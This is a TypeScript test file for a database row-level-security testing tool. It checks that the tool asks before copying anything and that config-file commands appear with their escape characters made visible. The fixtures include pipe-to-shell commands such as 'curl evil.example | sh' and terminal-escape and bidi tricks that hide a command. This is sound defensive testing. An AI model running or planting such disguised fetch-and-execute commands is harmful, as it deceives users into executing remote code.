import { beforeEach, describe, expect, it, vi } from 'vitest';

// run() with the database and the copy machinery faked: what matters is the order of events.
const events: string[] = [];
vi.mock('../src/isolation.js', () => ({
  createIsolation: async () => {
    events.push('createIsolation');
    return {
      mode: 'template', notes: [], dispose: async () => {},
      withPristine: async () => ({ status: 'passed', output: '', assertions: 1 }),
      withBreak: async () => ({ status: 'failed', output: '' })
    };
  }
}));
vi.mock('../src/guard.js', () => ({
  Guard: class {
    async connect() {
      events.push('read-source');
      return {
        query: async (sql: string) =>
          /server_version/.test(sql)
            ? { rows: [{ version: '17.0', addr: '127.0.0.1', port: 5432, bytes: '1000', pretty: '1000 bytes' }], rowCount: 1 }
            : { rows: [], rowCount: 0 },
        end: async () => {}
      };
    }
  }
}));

import { run, type RunOptions } from '../src/run.js';
import type { Prompter } from '../src/confirm.js';

const suite = {
  description: 'pnpm test:rls  (your command)', mode: 'custom' as const, files: [], contents: new Map(),
  run: async () => {
    events.push('run-tests');
    return { status: 'passed' as const, output: '' };
  }
};
const prompter = (answer: boolean): Prompter & { asked: string[] } => {
  const asked: string[] = [];
  return {
    interactive: true, asked, say: () => {},
    ask: async (q) => {
      asked.push(q);
      events.push('ask');
      return answer;
    },
    askSeparate: async (q) => {
      asked.push(q);
      events.push('ask');
      return answer;
    }
  };
};
const base = (confirm: Prompter, extra: Partial<RunOptions> = {}): RunOptions => ({
  dbUrl: 'postgres://postgres:postgres@127.0.0.1:55322/appdb', databaseSource: '--db-url', schemas: ['public'],
  suite, jobs: 1, threshold: 100, timeoutMs: 1000, terminate: true, onlyRelated: false, checksOnly: false,
  dryRun: false, skip: [], progress: () => {}, confirm, ...extra
});

beforeEach(() => void (events.length = 0));

describe('run asks before it copies anything', () => {
  it('shows the plan, and answering No stops before any copy or test run', async () => {
    const p = prompter(false);
    const { model } = await run(base(p));
    expect(p.asked).toHaveLength(1);
    expect(p.asked[0]).toContain('It will not change this database.');
    expect(p.asked[0]).toContain('pnpm test:rls');
    expect(p.asked[0]).toContain('appdb');
    expect(p.asked[0]).toContain('local');
    expect(p.asked[0]).toMatch(/\(y\/N\)$/);
    expect(events).not.toContain('createIsolation');
    expect(events).not.toContain('run-tests');
    expect(model.couldNotCheck).toMatch(/stopped before anything was copied/);
  });

  it('a test command from .rls-saboteur.json is shown exactly, and asked about first', async () => {
    const p = prompter(false);
    await run(base(p, { testFromConfig: 'curl evil.sh | sh' }));
    expect(p.asked).toHaveLength(1);
    expect(p.asked[0]).toContain('curl evil.sh | sh');
    expect(p.asked[0]).toContain('.rls-saboteur.json');
    expect(events).not.toContain('createIsolation');
    expect(events).not.toContain('run-tests');
  });

  it('with yes it asks the plan question, then copies', async () => {
    const p = prompter(true);
    await run(base(p, { testFromConfig: 'pnpm test:rls' }));
    expect(p.asked).toHaveLength(2);
    expect(events.indexOf('ask')).toBeLessThan(events.indexOf('createIsolation'));
  });

  it('dry runs and checks-only runs never ask', async () => {
    const p = prompter(false);
    await run(base(p, { dryRun: true }));
    await run(base(p, { checksOnly: true }));
    expect(p.asked).toHaveLength(0);
  });
});

describe('untrusted text in a question cannot disguise itself', () => {
  // A hostile .rls-saboteur.json could hide terminal escapes in its test command, so the screen shows
  // "npm test" while something else runs. Every such character is written out visibly instead.
  it('shows escape sequences and bidi overrides in a config-file command as visible text', async () => {
    const p = prompter(false);
    const hidden = 'curl evil.example | sh\x1b[2K\rnpm test‮';
    await run(base(p, { testFromConfig: hidden }));
    expect(p.asked[0]).not.toContain('\x1b');
    expect(p.asked[0]).not.toContain('\r');
    expect(p.asked[0]).not.toContain('‮');
    expect(p.asked[0]).toContain('curl evil.example | sh\\x1b[2K\\x0dnpm test\\u202e');
  });
});

describe('the prompter writes untrusted text visibly even if a caller forgets', () => {
  it('escapes control characters other than its own line breaks', async () => {
    const { makePrompter } = await import('../src/confirm.js');
    let written = '';
    const pr = makePrompter({ yes: true, out: { write: (s: string) => (written += s) } });
    await pr.ask('Run this?\n  npm test\x1b]0;x\x07', 'x');
    expect(written).not.toContain('\x1b');
    expect(written).toContain('Run this?\n  npm test\\x1b]0;x\\x07');
  });
});

describe('the plan tells the user what the test files and the environment can do', () => {
  beforeEach(() => {
    events.length = 0;
  });
  it('a pgTAP suite gets the note that test files run with the database user\'s rights; a custom command does not', async () => {
    const p = prompter(false);
    await run(base(p, { suite: { ...suite, mode: 'psql' as const, description: 'supabase/tests/*.sql  (pgTAP, run file by file with psql)' } }));
    expect(p.asked[0]).toMatch(/the test files are your code\. They run with the rights of your database user on this server/);
    const q = prompter(false);
    await run(base(q));
    expect(q.asked[0]).not.toMatch(/the test files are your code/);
  });
  it('lists the removed variable names and the .env files, never a value', async () => {
    const p = prompter(false);
    await run(base(p, { removedEnv: ['SUPABASE_SERVICE_ROLE_KEY', 'TEST_DATABASE_URL'], envFiles: ['.env.local'] }));
    expect(p.asked[0]).toContain('SUPABASE_SERVICE_ROLE_KEY, TEST_DATABASE_URL');
    expect(p.asked[0]).toMatch(/\.env\.local in this directory mention a database/);
  });
});
